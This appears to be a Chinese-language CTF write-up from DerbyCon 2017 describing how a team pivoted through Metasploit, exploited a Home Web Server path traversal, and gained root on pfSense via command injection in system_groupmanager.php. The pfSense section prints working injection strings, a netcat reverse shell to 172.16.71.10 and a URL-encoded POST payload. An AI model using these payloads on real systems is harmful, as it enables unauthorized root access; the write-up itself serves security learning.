[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0142f35ed78d217924.png)

我们利用笔记本电脑进行快速端口扫描，发现这台服务器确实存在，但没有开放端口。因此，我们需要设法找到这台服务器的具体访问方式。根据我们的推测，可能存在一些网络隔离，所以我们使用原来的服务器作为转发流量的枢纽点。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t010730e36f7b6010ef.png)

实际上，1433号端口在NUKELAUNCHDB上面是开放的，只是要通过NUKELAUNCH路由。

我们利用Metasploit内置的pivoting功能，通过NUKELAUNCH将流量推送到NUKELAUNCHDB。为此，只需简单地添加一条路由，类似于route add NUKELAUNCHDB 255.255.255.255 10，其中10是我们希望路由的会话号。然后我们启动了Metasploit的socks代理服务器。这样，我们就可以利用其他工具，并通过代理链将其流量推送到NUKELAUNCHDB了。 

在这个阶段，我们对sa帐户的密码进行了一些有根据的猜测，并使用基于CLR的自定义存储过程（http://sekirkity.com/command-execution-in-sql-server-via-fileless-clr-based -custom-stored-procedure /）获得了针对NUKELAUNCHDB上的底层操作系统的访问权限。



**ACMEWEAPONSCO**

根据HTTP响应的头部来看，我们发现这个主机运行的是一个易受攻击的Home Web Server版本。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t010cc86d256706cf48.png)

经研究发现以下exploit-db页面：

https://www.exploit-db.com/exploits/42128/

它详细介绍了路径遍历攻击，可以用于在受影响的机器上执行二进制文件。最初，我们想利用这个漏洞来运行编码的PowerShell命令，但是没有得手，所以我们开始寻找其他利用方式。

这个Web应用程序好像提供了文件上传功能，但功能不是很完善。

[![](https://p2.ssl.qhimg.com/t01420cf46a6fc83a61.png)](https://p2.ssl.qhimg.com/t01420cf46a6fc83a61.png)

然而，根据页面上有一个说明，发现FTP仍然可以用于上传文件，所以这就是我们的下一站。 

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01704307f77f38d950.png)

匿名FTP访问已启用，因此我们可以直接登录并上传可执行文件。眼下，我们可以将文件上传到目标系统并运行二进制文件。但是，我们不知道我们上传的二进制文件的完整路径。幸运的是，cgi-bin中有一个文本文件，详细介绍了相关的配置：

[![](https://p5.ssl.qhimg.com/t01f431b9bc29cc5628.png)](https://p5.ssl.qhimg.com/t01f431b9bc29cc5628.png)

接下来，我们要做的就是运行我们上传的二进制文件。以下Web请求可以完成这项工作，从而获取系统的访问权限。

[![](https://p3.ssl.qhimg.com/t01799c49a3be7987c0.png)](https://p3.ssl.qhimg.com/t01799c49a3be7987c0.png)

旗标分散在文件系统和MSSQL数据库中。其中一个旗标是在用户桌面上找到的，但是需要特定的图形格式才能访问，因此我们启用了RDP来抓取它。

**<br>**

**pfSense**

这个挑战是基于Scott Brit（@ s4squatch）在DerbyCon 2017之前不久发现的一个漏洞。这不是一个0day（Scott已经报告给了pfSense，而且在补丁说明中已经隐约提及了这个漏洞的情况），但是我们对它的了解非常有限。

这台机器只给我们开放了一个443 TCP端口，提供一个启用HTTPS服务的网站。访问该网站后，在登录页面发现了开源防火墙软件pfSense。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01efd0645377c5d9d0.jpg)

我们尝试猜解密码，例如典型的默认用户名和密码admin：pfsense；然而，这次没有成功。

一段时间后，我们将用户名更改为pfsense，并尝试使用pfsense密码，之后.Pfsense用户为我们提供了少量低分值的旗标。

乍看之下，这个挑战似乎是微非常普通。 pfSense有一个名为exec.php的页面，可以调用系统命令并运行PHP代码。不过，我们很快意识到pfsense用户几乎没有任何权限。我们只能访问少量页面。我们可以安装widgets查看一些系统信息（包括版本号），并通过图片widget来上传文件。尽管如此，在框这台机器上面获得shell的机会看起来非常渺茫。

然后，我们决定抓取由pfSense提供的所有页面的目录列表。我们抓取了一个软件的副本，并从文件系统中复制了所有的页面路径和名称。然后，将得到的列表与DirBuster工具结合起来实现自动化，我们尝试了每一个页面，试图确定是否有其他任何我们有权访问的东西。其中有两个页面返回了HTTP 200 OK状态。



```
index.php – We already have this.
system_groupmanager.php – Hmm…
```

浏览到system_groupmanager.php后找到了另一个分值略高的旗标。

该页面负责管理组成员和他们拥有的权限；真棒！ 我们意识到我们的用户不是“admin”组的成员，所以将其加入了这一个用户组，但是好像没用：没有改变界面，也没有访问诸如exec.php这样的页面的权限。

几个小时过去了，我们试图寻找各种漏洞，但毫无进展。 当查看源代码时，在页面本身中没有找到任何漏洞，不过发现pfSense使用了大量的include，所以我们正在使用的方法与手动方式没太大区别。

随着时间的流逝，我们突然想到可以到Google搜索一下“system_groupmanager.php exploit”… 

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01f59fe295081a2999.png)

在搜索结果中有一个关于漏洞的简要描述以及与pfSense安全咨询通知相关的链接

https://www.rapid7.com/db/vulnerabilities/pfsense-sa-16_08-webgui

通过它，我们了解到了更多的信息示，包括问题的发现者，等等。嘿，这证实了我们可能步入正轨了。然而，我们没有找到任何公开的POC。

这个文章中包含下面一小段文字：

“A command-injection vulnerability exists in auth.inc via system_groupmanager.php.

This allows an authenticated WebGUI user with privileges for system_groupmanager.php to execute commands in the context of the root user.”

使用新文件作为代码审查的目标和目标参数，找到该漏洞将会相当容易，但是我们可以做得更好。

pfSense是一个开源项目，它使用GitHub进行版本控制。通过查看与auth.inc相关联的历史记录，我们很快就找出了受影响的代码行，这进一步简化了我们对该漏洞的探索过程。更好的是，安全提示的页脚内的信息显示了该软件的修补版本（2.3.1），进一步缩小了我们的搜索范围。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01adc606fc882ade13.png)

确定了特定的代码行后，我们就能够理解执行路径了： 

1.数字用户ID将提交给位于/usr/local/www/system_groupmanager.php中的代码

2.它作为PHP数组被传递给/etc/inc/auth.inc中的local_group_set（）函数。

3.在传入的数组上执行一个implode（），将数组对象转换为单个字符串对象，并使用逗号连接。

4.然后将它传递给一个名为mwexec（）的函数，并且没有事先进行任何类型的转义或过滤，该函数似乎调用了系统二进制程序/ usr / sbin / pw，现在是其参数的一部分。

为了利用此漏洞，我们需要用引号对该字符串进行转义处理，并键入合适的命令。

最初，我们利用盲注，所以没有将信息返回到网页，为此我们选择使用ping命令，然后使用Wireshark监控传入流量，以确认是否成功。

尽管我们对这个漏洞有了深入的了解，但是攻击仍然不尽如人意。 我们使用相同版本的pfSense软件（2.2.6）作为测试环境，并尝试使用相同的命令，虽然会导致同样的问题；但是仍然无法执行命令。 但是，由于我们对自己的实例获得了管理访问权限，因此我们可以查看系统日志和相关的错误信息。

不知何故，/sbin/ping或IP地址是被pw应用程序作为无效用户ID返回的，这意味着字符串转义没有完全成功，并且/usr/bin/pw实际上把我们的命令当成命令行参数了，这不符合我们的预期。

在鼓捣了更多的引号和转义序列之后，以下的字符串导致ping成功执行，并致使大量ICMP数据包涌入我们的网络接口。

```
0';/sbin/ping -c 1 172.16.71.10; /usr/bin/pw groupmod test -g 2003 -M '0
```

在CTF环境下尝试相同的输入也取得了成功。这样，我们已经实现了命令执行。当时，没有人获取该机器的root权限，并且如果我们想要通过@_DerbyconCTF在推特上提供的挑战分数成为赢家的话，就必须提高速度。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01accdc10a0045914d.png)

经再三考虑，我们认为下列方式要更加简练：

```
0';/sbin/ping -c 1 72.16.71.10;'
```

我们认为所有转义问题都将归结为以适当数量的引号来结束命令，但如前所述，在比赛期间，我们使用了更加繁琐的版本，毕竟当时只要管用就行了。

下一步…我们如何才能得到一个shell？

pfSense是FreeBSD的删减版本。没有提供wget，也没有提供curl。当然，我们可以用cat命令来写入网页目录，但是我们选择了一个传统的老式Linux反向shell。 感谢@PentestMonkey及其作弊表（http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet）：

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 172.16.71.10 12345 &amp;gt;/tmp/f
```

我们启动了一个netcat监听器，并将其作为完整参数的一部分使用：

```
0'; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 172.16.71.10 12345 &amp;gt;/tmp/f;/usr/sbin/pw groupmod test -g 2003 -M '0
```

或者，也可以像下面这样来借助于post请求：

```
&amp;amp;members=%5B%5D=0'%3brm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2&amp;gt;%261|nc+172.16.71.10+12345+&amp;gt;/tmp/f%3b/usr/sbin/pw+groupmod+test+-g+2003+-M+'0
```



攻击字符串准备就绪后，我们将用户移动到一个组中，通过保存操作来触发exploit。

我们对以下照片的质量感到很抱歉！

[![](https://p3.ssl.qhimg.com/t01f90bcaf98d2a7d00.jpg)](https://p3.ssl.qhimg.com/t01f90bcaf98d2a7d00.jpg)

这将导致代码运行，为我们创建一个反向连接，从而可以捕获包含在/root/flag.txt中的pfSense挑战的最后一个旗标。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01c244f7d4ac582a0e.jpg)

与此同时，我们获得了5000分，并将两枚TrustedSec挑战硬币中的第一枚收入囊中。

[![](https://p1.ssl.qhimg.com/t019a8ba4fe5e0b98f1.png)](https://p1.ssl.qhimg.com/t019a8ba4fe5e0b98f1.png)

[![](https://p0.ssl.qhimg.com/t016e1ee05e093c5733.jpg)](https://p0.ssl.qhimg.com/t016e1ee05e093c5733.jpg)

**<br>**

**朝鲜战略导弹攻击计划**

这个机器通过telnet提供了一个基于文本的游戏。

我们以为这个机器上的挑战会比原来是更难，所以在花了一些时间尝试几件事情之后，我们作出了一个战术决定，放弃它。 对我们来说有点令人沮丧，这是个错误的决定，因为实际上拿下这个机器并非我们想像的那么难。

从help命令看，我们认为它可能是Ruby命令注入。在CTF结束后，我们曾与SwAG团队就这个进行过交流，我们了解到当初的判断是正确的，正确的解决之道就是找到正确点来注入Ruby命令。最后这个挑战被其他团队拿下，同时还要感谢DerbyCon CTF组织者，在比赛结束后提供了一些截图，才使得我们有机会跟大家分享。 我们将分享我们对这个机器上面的挑战问题的分析，但需要说明的是，我们未能在竞争中解决这个问题。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t013c309d5b483cf6d9.png)

它提供了一个帮助命令，这导致我们怀疑这可能是在玩Ruby命令注入。帮助命令打印出各种游戏命令以及公共/私有函数。 其中的一小部分样本如下所示： 



```
target=
position
position=
id
yield=
arm!
armed?
```

这些帮我们确定出在幕后运行的Ruby代码为：

```
equal?
instance_eval
instance_exec
```

我们手动尝试了几个攻击矢量，但是我们需要一种自动化的方法；手动尝试注入攻击需要花费的时间太长。 为此，我们使用expect生成了一个自定义脚本。 如果你对expect还不熟悉的话，以下是维基百科对它的简介：

“expect，由Don Libes编写，它是一个Tcl脚本语言的插件，是一种用来实现与提供文本终端接口的程序进行自动交互的程序。”

我们经常不得不利用一堆自定义脚本来自动执行各种任务，因此如果您不熟悉这个程序的话，倒是值得深入了解一下。 我们实现的自动执行任务的代码如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01e8375d0135f0fc6c.png)

然后，我们从游戏中获取了所有的命令，并通过这个expect脚本来运行：

```
cat commands | xargs -I`{``}` ./expect.sh `{``}` | grep "Enter Command:" -A 1
```

在找出我们认为是游戏中正确的序列之后，我们尝试了多种注射技术，但是都没有成功。其示例如下所示：



```
cat commands | xargs -I`{``}` ./expect.sh `{``}`” print 1” | grep "Enter Command:" -A 1
cat commands | xargs -I`{``}` ./expect.sh `{``}`”&amp;amp;&amp;amp; print 1” | grep "Enter Command:" -A 1
cat commands | xargs -I`{``}` ./expect.sh `{``}`”|| print 1” | grep "Enter Command:" -A 1
cat commands | xargs -I`{``}` ./expect.sh `{``}`”; print 1” | grep "Enter Command:" -A 1
```

我们也尝试用exec或system来ping我们，因为我们不知道响应是否是blind的，或结果是否显示到屏幕上面：

```
cat commands | xargs -I`{``}` ./expect.sh `{``}`” exec(‘ping 172.16.70.146’)”
```

识别主机操作系统并不容易，所以我们必须确保我们运行的命令可以同时在Windows和Linux上运行。这里没有开放telnet以外的端口，甚至无法ping主机找到TTL，因为防火墙会阻止所有其他入站连接。

最后，我们没有成功。

在与CTG团队SwAG进行讨论之后，他们终于搞清楚了这里的注入技术：这是一个在Ruby中使用eval语句的例子，后面是一个要执行的命令，例如：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t013f9c31b4f93bee3b.png)

还应该注意的是，你不能在payload中使用空格。 

**<br>**

**re-exploitation的自动化**

最后，我们来聊一聊效率方面的话题。

在CTF的过程中，一些机器被定期重置为初始状态，因为他们会被使用不稳定的exploit的人搞崩溃。这意味着什么？那就是每隔一段时间，就需要重新获取一次系统的访问权限，尽管你之前已经成功拿下了。

为了加快这一过程，我们匆匆拼凑了一些脚本来自动化这一过程。其中一个示例脚本如下所示：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01a29b053a18ca6daf.png)

这种做法是非常有价值的，因为它能节约宝贵的时间。



**小结**

今后，我们将继续参加DerbyCon，我们坚信它在信息安全领域质量最高的比赛之一，同时也是最值得参加的比赛之一。另外，最让人感到高兴的是，每次参加比赛，我们都有机会结交新的朋友，希望下一次参加比赛时，我们认识的新朋友中会有你！
